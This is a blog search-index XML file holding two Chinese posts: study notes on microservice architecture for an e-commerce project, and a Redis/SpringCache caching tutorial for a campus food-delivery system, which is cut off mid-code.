<?xml version="1.0" encoding="utf-8"?>
<search>
  
  
  
  <entry>
    <title>天天商城随记</title>
    <link href="/2025/03/09/%E5%A4%A9%E5%A4%A9%E5%95%86%E5%9F%8E%E9%9A%8F%E8%AE%B0/"/>
    <url>/2025/03/09/%E5%A4%A9%E5%A4%A9%E5%95%86%E5%9F%8E%E9%9A%8F%E8%AE%B0/</url>
    
    <content type="html"><![CDATA[<h4 id="1-服务注册与动态配置（Nacos）"><a href="#1-服务注册与动态配置（Nacos）" class="headerlink" title="1. 服务注册与动态配置（Nacos）"></a><strong>1. 服务注册与动态配置（Nacos）</strong></h4><p><strong>场景</strong>：<br>在微服务架构中，商城被拆分为订单服务、商品服务、用户服务等独立模块。每个服务需要动态发现其他服务的地址，并实时获取配置（如数据库连接、开关参数）。<br><strong>技术解释</strong>：  </p><ul><li><strong>Nacos</strong> 作为注册中心，各服务启动时向 Nacos 注册自身 IP 和端口，服务间通过 OpenFeign 调用时，Nacos 提供目标服务的地址列表，Ribbon 实现负载均衡（如轮询、随机策略）。  </li><li><strong>动态配置管理</strong>：将数据库配置、限流阈值等存储在 Nacos 配置中心，修改配置后无需重启服务即可生效，极大提升运维效率。</li></ul><hr><h4 id="2-服务保护与熔断降级（Sentinel）"><a href="#2-服务保护与熔断降级（Sentinel）" class="headerlink" title="2. 服务保护与熔断降级（Sentinel）"></a><strong>2. 服务保护与熔断降级（Sentinel）</strong></h4><p><strong>场景</strong>：<br>大促期间商品查询接口 QPS 突增至 1000+，若不做保护可能导致服务雪崩。<br><strong>技术实现</strong>：  </p><ul><li><strong>流量控制</strong>：通过 Sentinel 设置商品查询接口的 QPS 阈值为 500&#x2F;s，超限请求直接拒绝，避免资源耗尽。  </li><li><strong>熔断降级</strong>：当接口错误率超过 50% 时触发熔断，后续请求快速失败，结合 OpenFeign 的 FallbackFactory 返回兜底数据（如默认商品列表），保障核心链路可用。  </li><li><strong>线程隔离</strong>：为商品服务分配独立线程池（最大并发线程数 ≤50），防止某个接口故障影响其他业务。</li></ul><hr><h4 id="3-订单超时与库存回滚（RabbitMQ）"><a href="#3-订单超时与库存回滚（RabbitMQ）" class="headerlink" title="3. 订单超时与库存回滚（RabbitMQ）"></a><strong>3. 订单超时与库存回滚（RabbitMQ）</strong></h4><p><strong>场景</strong>：<br>用户下单后未支付，需在 30 分钟后自动关闭订单并释放库存。<br><strong>技术实现</strong>：  </p><ul><li><strong>延迟队列+死信队列</strong>：订单创建时发送一条延迟消息（TTL&#x3D;30分钟）到 RabbitMQ，消息到期后转入死信队列，消费者监听死信队列触发关单逻辑。  </li><li><strong>消息可靠性</strong>：通过生产者确认机制（Confirm）确保消息成功投递；消费者手动 ACK 避免消息丢失。  </li><li><strong>分布式事务</strong>：结合 Seata AT 模式，关单时调用库存服务的回滚接口，保障数据一致性。</li></ul><hr><h4 id="4-商品搜索优化（Elasticsearch）"><a href="#4-商品搜索优化（Elasticsearch）" class="headerlink" title="4. 商品搜索优化（Elasticsearch）"></a><strong>4. 商品搜索优化（Elasticsearch）</strong></h4><p><strong>场景</strong>：<br>用户输入模糊关键词（如“苹果手机”）时，需快速返回精准结果。<br><strong>技术实现</strong>：  </p><ul><li><strong>全文检索</strong>：使用 Elasticsearch 倒排索引技术，支持毫秒级响应。  </li><li><strong>智能分词</strong>：集成 IK 分词器对中文语义拆分（如“苹果手机”拆分为“苹果”“手机”），结合拼音插件支持拼音搜索（如输入“pingguo”匹配“苹果”）。  </li><li><strong>聚合分析</strong>：统计商品销量、价格区间等，支持后台运营决策。</li></ul><hr><h4 id="5-多级缓存架构（Caffeine-Redis）"><a href="#5-多级缓存架构（Caffeine-Redis）" class="headerlink" title="5. 多级缓存架构（Caffeine + Redis）"></a><strong>5. 多级缓存架构（Caffeine + Redis）</strong></h4><p><strong>场景</strong>：<br>热点商品（如秒杀商品）频繁被查询，直接访问数据库会导致性能瓶颈。<br><strong>技术实现</strong>：  </p><ul><li><strong>本地缓存</strong>：使用 Caffeine 缓存热点商品数据（TTL&#x3D;5分钟），减少网络开销，响应时间 &lt;1ms。  </li><li><strong>分布式缓存</strong>：Redis 集群缓存商品详情，通过 Lua 脚本保证原子性操作（如库存扣减）。  </li><li><strong>防穿透</strong>：布隆过滤器拦截无效商品 ID 请求，空值缓存避免重复查询数据库。</li></ul><hr><h4 id="6-容器化部署（Docker）"><a href="#6-容器化部署（Docker）" class="headerlink" title="6. 容器化部署（Docker）"></a><strong>6. 容器化部署（Docker）</strong></h4><p><strong>场景</strong>：<br>快速部署微服务模块，实现环境一致性。<br><strong>技术实现</strong>：  </p><ul><li>每个服务打包为 Docker 镜像，通过 Docker Compose 或 Kubernetes 编排容器，一键启动。  </li><li>资源隔离：每个服务运行在独立容器中，避免端口冲突和依赖污染。</li></ul><hr><h4 id="7-数据持久化优化（Mybatis-Plus）"><a href="#7-数据持久化优化（Mybatis-Plus）" class="headerlink" title="7. 数据持久化优化（Mybatis-Plus）"></a><strong>7. 数据持久化优化（Mybatis-Plus）</strong></h4><p><strong>场景</strong>：<br>高频 CRUD 操作（如订单状态更新）需兼顾效率与代码简洁性。<br><strong>技术实现</strong>：  </p><ul><li><strong>自动生成代码</strong>：Mybatis-Plus 根据表结构生成实体类、Mapper 接口和基础 CRUD 方法，减少 30% 重复代码。  </li><li><strong>Lambda 查询</strong>：链式 API 编写复杂查询，提升可读性（如 <code>QueryWrapper&lt;User&gt;().eq(&quot;status&quot;,1).orderByDesc(&quot;create_time&quot;)</code>）。</li></ul><hr><h4 id="8-分布式链路追踪（SkyWalking-x2F-Zipkin）"><a href="#8-分布式链路追踪（SkyWalking-x2F-Zipkin）" class="headerlink" title="8. 分布式链路追踪（SkyWalking&#x2F;Zipkin）"></a><strong>8. 分布式链路追踪（SkyWalking&#x2F;Zipkin）</strong></h4><p><strong>场景</strong>：<br>用户下单请求需经过网关→订单服务→库存服务→支付服务，链路复杂，需快速定位性能瓶颈或故障点。<br><strong>技术实现</strong>：  </p><ul><li>集成 <strong>SkyWalking</strong>，通过探针自动采集服务间调用链路的耗时、状态、异常信息，生成可视化拓扑图。  </li><li>结合 <strong>Trace ID</strong> 实现全链路日志关联，例如通过日志中的唯一ID追踪某个订单在所有微服务中的处理过程。  </li><li>核心价值：降低跨服务调试难度，快速识别慢查询（如某个数据库操作耗时突增）。</li></ul><hr><h4 id="9-分库分表与读写分离（ShardingSphere）"><a href="#9-分库分表与读写分离（ShardingSphere）" class="headerlink" title="9. 分库分表与读写分离（ShardingSphere）"></a><strong>9. 分库分表与读写分离（ShardingSphere）</strong></h4><p><strong>场景</strong>：<br>订单表数据量超千万级，单库性能无法支撑高并发读写。<br><strong>技术实现</strong>：  </p><ul><li>使用 <strong>ShardingSphere</strong> 对订单表按用户ID哈希分片，分散到多个数据库实例，提升写入吞吐量。  </li><li>读写分离：写操作走主库，读操作路由到从库，通过 <strong>MySQL主从同步</strong> 保障数据一致性。  </li><li>动态扩缩容：通过分片策略灵活扩展数据库节点，适应业务增长。</li></ul><hr><h4 id="10-API网关进阶功能（Spring-Cloud-Gateway）"><a href="#10-API网关进阶功能（Spring-Cloud-Gateway）" class="headerlink" title="10. API网关进阶功能（Spring Cloud Gateway）"></a><strong>10. API网关进阶功能（Spring Cloud Gateway）</strong></h4><p><strong>场景</strong>：<br>需统一鉴权、动态路由、请求限流，并防止恶意爬虫攻击。<br><strong>技术实现</strong>：  </p><ul><li><strong>动态路由</strong>：根据请求路径（如 <code>/order/**</code>）将流量分发到不同服务集群，支持灰度发布。  </li><li><strong>限流与防刷</strong>：网关层集成Sentinel，对IP或用户ID设置每秒请求上限（如10次&#x2F;秒），拦截异常流量。  </li><li><strong>鉴权集成</strong>：在网关层校验JWT令牌，无效或过期请求直接返回401，减少后端服务压力。</li></ul><hr><h4 id="11-日志集中化分析（ELK-Stack）"><a href="#11-日志集中化分析（ELK-Stack）" class="headerlink" title="11. 日志集中化分析（ELK Stack）"></a><strong>11. 日志集中化分析（ELK Stack）</strong></h4><p><strong>场景</strong>：<br>微服务日志分散在多个容器中，排查问题需登录多个服务器，效率低下。<br><strong>技术实现</strong>：  </p><ul><li><strong>Filebeat</strong> 采集各容器日志，发送至 <strong>Logstash</strong> 进行过滤和格式化。  </li><li><strong>Elasticsearch</strong> 存储结构化日志，<strong>Kibana</strong> 提供可视化看板，支持关键词搜索（如“订单超时”）。  </li><li>核心价值：实时监控错误日志（如500状态码），快速定位异常服务。</li></ul><hr><h4 id="12-持续集成与交付（CI-x2F-CD）"><a href="#12-持续集成与交付（CI-x2F-CD）" class="headerlink" title="12. 持续集成与交付（CI&#x2F;CD）"></a><strong>12. 持续集成与交付（CI&#x2F;CD）</strong></h4><p><strong>场景</strong>：<br>频繁的功能迭代需保证代码质量并快速部署到测试&#x2F;生产环境。<br><strong>技术实现</strong>：  </p><ul><li><strong>Jenkins&#x2F;GitLab CI</strong> 自动化流水线：代码提交后触发单元测试、代码扫描（SonarQube）、镜像构建与推送。  </li><li><strong>Kubernetes滚动更新</strong>：新版本服务镜像逐步替换旧实例，实现零停机发布。  </li><li>核心价值：减少人为失误，提升发布效率（从小时级缩短至分钟级）。</li></ul><hr><h4 id="13-安全加固（OAuth2-Spring-Security）"><a href="#13-安全加固（OAuth2-Spring-Security）" class="headerlink" title="13. 安全加固（OAuth2 + Spring Security）"></a><strong>13. 安全加固（OAuth2 + Spring Security）</strong></h4><p><strong>场景</strong>：<br>用户敏感操作（如支付、修改密码）需防范CSRF、XSS攻击，并实现精细化的权限控制。<br><strong>技术实现</strong>：  </p><ul><li><strong>OAuth2授权码模式</strong>：第三方应用（如合作商户）接入时，通过授权服务器获取访问令牌，避免密码泄露。  </li><li><strong>RBAC权限模型</strong>：基于角色的访问控制，例如“管理员”可删除商品，“普通用户”仅可浏览。  </li><li><strong>请求过滤</strong>：通过Spring Security的 <code>XSSFilter</code> 对用户输入进行转义，防止脚本注入。</li></ul><hr><h4 id="14-容器编排与自动化扩缩容（Kubernetes）"><a href="#14-容器编排与自动化扩缩容（Kubernetes）" class="headerlink" title="14. 容器编排与自动化扩缩容（Kubernetes）"></a><strong>14. 容器编排与自动化扩缩容（Kubernetes）</strong></h4><p><strong>场景</strong>：<br>大促期间订单服务需快速扩容以应对流量高峰，活动结束后自动缩容以节省资源。<br><strong>技术实现</strong>：  </p><ul><li><strong>HPA（水平Pod自动扩缩容）</strong>：根据CPU&#x2F;内存使用率或自定义指标（如QPS）动态调整Pod数量。  </li><li><strong>服务网格（Istio）</strong>：精细化流量管理（如A&#x2F;B测试），故障注入模拟服务异常，测试系统容错能力。</li></ul><hr><h4 id="15-压力测试与性能调优（JMeter-Arthas）"><a href="#15-压力测试与性能调优（JMeter-Arthas）" class="headerlink" title="15. 压力测试与性能调优（JMeter + Arthas）"></a><strong>15. 压力测试与性能调优（JMeter + Arthas）</strong></h4><p><strong>场景</strong>：<br>需验证系统在万级并发下的稳定性，并优化接口响应时间。<br><strong>技术实现</strong>：  </p><ul><li><strong>JMeter模拟压测</strong>：构造高并发下单场景（如1万用户同时抢购），观察数据库连接池、线程池等资源瓶颈。  </li><li><strong>Arthas在线诊断</strong>：通过 <code>trace</code> 命令追踪方法调用链耗时，定位慢SQL或锁竞争问题。  </li><li>优化手段：调整JVM参数（如堆内存分配）、优化SQL索引、引入本地缓存等。</li></ul>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>校园闪送项目笔记</title>
    <link href="/2025/03/06/%E6%A0%A1%E5%9B%AD%E9%97%AA%E9%80%81%E9%A1%B9%E7%9B%AE%E7%AC%94%E8%AE%B0/"/>
    <url>/2025/03/06/%E6%A0%A1%E5%9B%AD%E9%97%AA%E9%80%81%E9%A1%B9%E7%9B%AE%E7%AC%94%E8%AE%B0/</url>
    
    <content type="html"><![CDATA[<h1 id="项目：校园内送"><a href="#项目：校园内送" class="headerlink" title="项目：校园内送"></a>项目：校园内送</h1><hr><h2 id="1-Redis缓存高频数据与SpringCache优化"><a href="#1-Redis缓存高频数据与SpringCache优化" class="headerlink" title="1. Redis缓存高频数据与SpringCache优化"></a><strong>1. Redis缓存高频数据与SpringCache优化</strong></h2><h3 id="场景描述"><a href="#场景描述" class="headerlink" title="场景描述"></a><strong>场景描述</strong></h3><p><strong>校园闪送</strong> 是一款为餐饮企业定制的 B&#x2F;S 架构系统，包含管理端（供商家管理菜品、订单、数据统计）和用户端（微信小程序点餐、支付）。系统的主要功能包括：</p><ol><li><strong>商家管理端</strong>：<ul><li>管理菜品信息（添加、删除、修改菜品）。</li><li>查看订单列表和订单详情。</li><li>数据统计和报表生成。</li></ul></li><li><strong>用户端</strong>：<ul><li>浏览菜品分类和菜品详情。</li><li>下单、支付、催单等操作。</li><li>查看订单状态。</li></ul></li></ol><hr><h3 id="为什么使用-Redis-缓存？"><a href="#为什么使用-Redis-缓存？" class="headerlink" title="为什么使用 Redis 缓存？"></a><strong>为什么使用 Redis 缓存？</strong></h3><h4 id="1-高频数据访问"><a href="#1-高频数据访问" class="headerlink" title="1. 高频数据访问"></a><strong>1. 高频数据访问</strong></h4><p>在校园闪送系统中，某些数据会被频繁访问，例如：</p><ul><li><strong>菜品分类</strong>：用户在点餐时需要频繁查询菜品分类。</li><li><strong>热门菜品</strong>：用户经常访问的菜品信息。</li><li><strong>订单状态</strong>：用户和商家需要实时查看订单的最新状态。</li></ul><p>这些数据的查询频率很高，如果每次都从数据库中读取，会导致数据库压力过大，响应速度变慢。通过将这些高频数据缓存到 Redis 中，可以显著减少数据库的访问次数，提升系统的响应速度。</p><h4 id="2-缓存穿透、击穿和雪崩问题"><a href="#2-缓存穿透、击穿和雪崩问题" class="headerlink" title="2. 缓存穿透、击穿和雪崩问题"></a><strong>2. 缓存穿透、击穿和雪崩问题</strong></h4><p>在实际应用中，缓存可能会面临以下问题：</p><ul><li><strong>缓存穿透</strong>：查询不存在的数据，导致数据库被频繁访问。</li><li><strong>缓存击穿</strong>：热点数据的缓存失效时，大量请求直接冲击数据库。</li><li><strong>缓存雪崩</strong>：大量缓存同时失效，导致数据库压力过大。</li></ul><p>通过使用 Redis 缓存，并结合 SpringCache 的注解，可以有效解决这些问题，确保系统的稳定性。</p><h4 id="3-提升系统性能"><a href="#3-提升系统性能" class="headerlink" title="3. 提升系统性能"></a><strong>3. 提升系统性能</strong></h4><p>Redis 是一种高性能的内存数据库，读写速度非常快（通常在微秒级别）。通过将高频数据缓存到 Redis 中，可以显著提升系统的读取速度，减少数据库的负载，从而提升整体性能。</p><h4 id="4-分布式系统的需求"><a href="#4-分布式系统的需求" class="headerlink" title="4. 分布式系统的需求"></a><strong>4. 分布式系统的需求</strong></h4><p>在分布式系统中，多个服务实例可能需要共享某些数据。Redis 作为一个分布式缓存系统，可以方便地实现数据的共享和同步，确保系统的一致性。</p><hr><h3 id="具体场景分析"><a href="#具体场景分析" class="headerlink" title="具体场景分析"></a><strong>具体场景分析</strong></h3><h4 id="场景-1：菜品分类和热门菜品的缓存"><a href="#场景-1：菜品分类和热门菜品的缓存" class="headerlink" title="场景 1：菜品分类和热门菜品的缓存"></a><strong>场景 1：菜品分类和热门菜品的缓存</strong></h4><ul><li><strong>问题</strong>：用户在点餐时需要频繁查询菜品分类和热门菜品。如果每次都从数据库中读取，会导致数据库压力过大。</li><li><strong>解决方案</strong>：<ul><li>使用 <strong>Redis</strong> 缓存菜品分类和热门菜品数据。</li><li>通过 <strong>SpringCache</strong> 的 <code>@Cacheable</code> 注解，将查询结果缓存到 Redis 中。</li><li>设置合理的缓存过期时间（如 5 分钟），确保数据的时效性。</li></ul></li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-meta">@Cacheable(value = &quot;dish-categories&quot;, key = &quot;#root.methodName&quot;)</span><br><span class="hljs-keyword">public</span> List&lt;DishCategory&gt; <span class="hljs-title function_">getDishCategories</span><span class="hljs-params">()</span> &#123;<br>    System.out.println(<span class="hljs-string">&quot;Fetching dish categories from database...&quot;</span>);<br>    <span class="hljs-keyword">return</span> dishRepository.findAllCategories();<br>&#125;<br></code></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-meta">@Cacheable(value = &quot;hot-dishes&quot;, key = &quot;#categoryId&quot;)</span><br><span class="hljs-keyword">public</span> List&lt;Dish&gt; <span class="hljs-title function_">getHotDishesByCategory</span><span class="hljs-params">(<span class="hljs-type">int</span> categoryId)</span> &#123;<br>    System.out.println(<span class="hljs-string">&quot;Fetching hot dishes from database...&quot;</span>);<br>    <span class="hljs-keyword">return</span> dishRepository.findHotDishesByCategory(categoryId);<br>&#125;<br></code></pre></td></tr></table></figure><h4 id="场景-2：订单状态的缓存"><a href="#场景-2：订单状态的缓存" class="headerlink" title="场景 2：订单状态的缓存"></a><strong>场景 2：订单状态的缓存</strong></h4><ul><li><strong>问题</strong>：用户和商家需要实时查看订单的最新状态。订单状态的查询频率很高，如果每次都从数据库中读取，会导致数据库压力过大。</li><li><strong>解决方案</strong>：<ul><li>使用 <strong>Redis</strong> 缓存订单状态。</li><li>在订单状态更新时，同步更新缓存，确保数据的一致性。</li></ul></li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-meta">@Cacheable(value = &quot;order-status&quot;, key = &quot;#orderId&quot;)</span><br><span class="hljs-keyword">public</span> OrderStatus <span class="hljs-title function_">getOrderStatus</span><span class="hljs-params">(<span class="hljs-type">int</span> orderId)</span> &#123;<br>    System.out.println(<span class="hljs-string">&quot;Fetching order status from database...&quot;</span>);<br>    <span class="hljs-keyword">return</span> orderRepository.findOrderStatus(orderId);<br>&#125;<br></code></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-meta">@CachePut(value = &quot;order-status&quot;, key = &quot;#order.id&quot;)</span><br><span class="hljs-keyword">public</span> OrderStatus <span class="hljs-title function_">updateOrderStatus</span><span class="hljs-params">(Order order)</span> &#123;<br>    orderRepository.updateOrderStatus(order);<br>    <span class="hljs-keyword">return</span> order.getStatus();<br>&#125;<br></code></pre></td></tr></table></figure><h4 id="场景-3：缓存穿透、击穿和雪崩的解决方案"><a href="#场景-3：缓存穿透、击穿和雪崩的解决方案" class="headerlink" title="场景 3：缓存穿透、击穿和雪崩的解决方案"></a><strong>场景 3：缓存穿透、击穿和雪崩的解决方案</strong></h4><ul><li><strong>缓存穿透</strong>：对于查询结果为空的数据，也存储一个空对象到缓存中，设置较短的过期时间（如 1 分钟）。</li><li><strong>缓存击穿</strong>：使用布隆过滤器（Bloom Filter）预判数据是否存在，避免查询不存在的数据。</li><li><strong>缓存雪崩</strong>：为缓存设置随机的过期时间，避免大量缓存同时失效；使用本地缓存（如 Caffeine）作为二级缓存，缓解 Redis 压力。</li></ul><hr><h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a><strong>总结</strong></h3><p>在 <strong>校园闪送</strong> 项目中，使用 <strong>Redis</strong> 缓存高频数据并结合 <strong>SpringCache</strong> 进行优化的主要原因包括：</p><ol><li><strong>高频数据访问</strong>：减少数据库压力，提升系统响应速度。</li><li><strong>解决缓存问题</strong>：有效应对缓存穿透、击穿和雪崩问题，确保系统稳定性。</li><li><strong>提升系统性能</strong>：利用 Redis 的高性能读写能力，优化系统性能。</li><li><strong>分布式系统需求</strong>：实现数据共享和同步，确保系统一致性。</li></ol><hr><h3 id="1-引入-Redis-和-SpringCache-依赖"><a href="#1-引入-Redis-和-SpringCache-依赖" class="headerlink" title="1. 引入 Redis 和 SpringCache 依赖"></a><strong>1. 引入 Redis 和 SpringCache 依赖</strong></h3><p>在 Spring Boot 项目中，需要引入 Redis 和 SpringCache 的相关依赖。通常使用 <code>spring-boot-starter-data-redis</code> 和 <code>spring-context-support</code>。</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.springframework.boot<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>spring-boot-starter-data-redis<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.springframework.boot<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>spring-boot-starter-cache<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br></code></pre></td></tr></table></figure><hr><h3 id="2-配置-Redis-连接"><a href="#2-配置-Redis-连接" class="headerlink" title="2. 配置 Redis 连接"></a><strong>2. 配置 Redis 连接</strong></h3><p>在 <code>application.properties</code> 或 <code>application.yml</code> 文件中配置 Redis 的连接信息。</p><figure class="highlight properties"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs properties"><span class="hljs-comment"># Redis 配置</span><br><span class="hljs-attr">spring.redis.host</span>=<span class="hljs-string">localhost</span><br><span class="hljs-attr">spring.redis.port</span>=<span class="hljs-string">6379</span><br><span class="hljs-attr">spring.redis.password</span>=<span class="hljs-string">your_password</span><br><span class="hljs-attr">spring.redis.database</span>=<span class="hljs-string">0</span><br></code></pre></td></tr></table></figure><hr><h3 id="3-配置-SpringCache"><a href="#3-配置-SpringCache" class="headerlink" title="3. 配置 SpringCache"></a><strong>3. 配置 SpringCache</strong></h3><p>在 Spring Boot 项目中启用缓存支持，并配置缓存管理器。</p><h4 id="1-启用缓存支持"><a href="#1-启用缓存支持" class="headerlink" title="(1) 启用缓存支持"></a><strong>(1) 启用缓存支持</strong></h4><p>在主类或配置类上添加 <code>@EnableCaching</code> 注解，启用 SpringCache 功能。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-meta">@SpringBootApplication</span><br><span class="hljs-meta">@EnableCaching</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">CampusFlashDeliveryApplication</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br>        SpringApplication.run(CampusFlashDeliveryApplication.class, args);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h4 id="2-配置缓存管理器"><a href="#2-配置缓存管理器" class="headerlink" title="(2) 配置缓存管理器"></a><strong>(2) 配置缓存管理器</strong></h4><p>配置 Redis 作为缓存存储，定义缓存管理器和序列化策略。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-meta">@Configuration</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">CacheConfig</span> &#123;<br>    <span class="hljs-meta">@Bean</span><br>    <span class="hljs-keyword">public</span> RedisCacheManager <span class="hljs-title function_">cacheManager</span><span class="hljs-params">(RedisConnectionFactory redisConnectionFactory)</span> &#123;<br>        <span class="hljs-type">RedisCacheConfiguration</span> <span class="hljs-variable">config</span> <span class="hljs-operator">=</span> RedisCacheConfiguration.defaultCacheConfig()<br>                .entryTtl(Duration.ofMinutes(<span class="hljs-number">5</span>)) <span class="hljs-comment">// 设置默认缓存过期时间</span><br>                .disableCachingNullValues() <span class="hljs-comment">// 不缓存空值</span><br>                .serializeKeysWith(RedisSerializationContext.SerializationPair.string()) <span class="hljs-comment">// 键的序列化方式</span><br>                .serializeValuesWith(RedisSerializationContext.SerializationPair.json()); <span class="hljs-comment">// 值的序列化方式</span><br><br>        <span class="hljs-keyword">return</span> RedisCacheManager.builder(redisConnectionFactory)<br>                .cacheDefaults(config)<br>                .build();<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><hr><h3 id="4-使用-SpringCache-注解缓存高频数据"><a href="#4-使用-SpringCache-注解缓存高频数据" class="headerlink" title="4. 使用 SpringCache 注解缓存高频数据"></a><strong>4. 使用 SpringCache 注解缓存高频数据</strong></h3><p>在业务逻辑中，使用 SpringCache 提供的注解（如 <code>@Cacheable</code>、<code>@CachePut</code>、<code>@CacheEvict</code>）来缓存和管理数据。</p><h4 id="1-缓存菜品分类数据"><a href="#1-缓存菜品分类数据" class="headerlink" title="(1) 缓存菜品分类数据"></a><strong>(1) 缓存菜品分类数据</strong></h4><p>假设有一个 <code>DishService</code>，用于获取菜品分类数据。可以使用 <code>@Cacheable</code> 注解将结果缓存到 Redis 中。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-meta">@Service</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">DishService</span> &#123;<br>    <span class="hljs-meta">@Autowired</span><br>    <span class="hljs-keyword">private</span> DishRepository dishRepository;<br><br>    <span class="hljs-meta">@Cacheable(value = &quot;dish-categories&quot;, key = &quot;#root.methodName&quot;)</span><br>    <span class="hljs-keyword">public</span> List&lt;DishCategory&gt; <span class="hljs-title function_">getDishCategories</span><span class="hljs-params">()</span> &#123;<br>        System.out.println(<span class="hljs-string">&quot;Fetching dish categories from database...&quot;</span>);<br>        <span class="hljs-keyword">return</span> dishRepository.findAllCategories();<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><ul><li>**<code>value</code>**：指定缓存的名称（如 <code>dish-categories</code>）。</li><li>**<code>key</code>**：指定缓存的键（如方法名 <code>#root.methodName</code>）。</li><li>**<code>unless</code>**：可以指定条件，决定是否缓存结果（如 <code>unless = &quot;#result == null&quot;</code>）。</li></ul><h4 id="2-缓存热门菜品数据"><a href="#2-缓存热门菜品数据" class="headerlink" title="(2) 缓存热门菜品数据"></a><strong>(2) 缓存热门菜品数据</strong></h4><p>对于高频访问的热门菜品数据，也可以使用 <code>@Cacheable</code> 注解缓存。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-meta">@Cacheable(value = &quot;hot-dishes&quot;, key = &quot;#categoryId&quot;)</span><br><span class="hljs-keyword">public</span> List&lt;Dish&gt; <span class="hljs-title function_">getHotDishesByCategory</span><span class="hljs-params">(<span class="hljs-type">int</span> categoryId)</span> &#123;<br>    System.out.println(<span class="hljs-string">&quot;Fetching hot dishes from database...&quot;</span>);<br>    <span class="hljs-keyword">return</span> dishRepository.findHotDishesByCategory(categoryId);<br>&#125;<br></code></pre></td></tr></table></figure><hr><h3 id="5-缓存穿透、击穿、雪崩的解决方案"><a href="#5-缓存穿透、击穿、雪崩的解决方案" class="headerlink" title="5. 缓存穿透、击穿、雪崩的解决方案"></a><strong>5. 缓存穿透、击穿、雪崩的解决方案</strong></h3><p>在实际应用中，需要解决缓存穿透、击穿和雪崩问题，确保系统的稳定性。</p><h4 id="1-缓存穿透"><a href="#1-缓存穿透" class="headerlink" title="(1) 缓存穿透"></a><strong>(1) 缓存穿透</strong></h4><ul><li><strong>问题</strong>：查询不存在的数据，导致数据库被频繁访问。</li><li><strong>解决方案</strong>：对于查询结果为空的数据，也存储一个空对象（如 <code>null</code> 或自定义的空对象）到缓存中，设置较短的过期时间（如 1 分钟）。</li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-meta">@Cacheable(value = &quot;dish-details&quot;, key = &quot;#dishId&quot;, unless = &quot;#result == null&quot;)</span><br><span class="hljs-keyword">public</span> Dish <span class="hljs-title function_">getDishDetails</span><span class="hljs-params">(<span 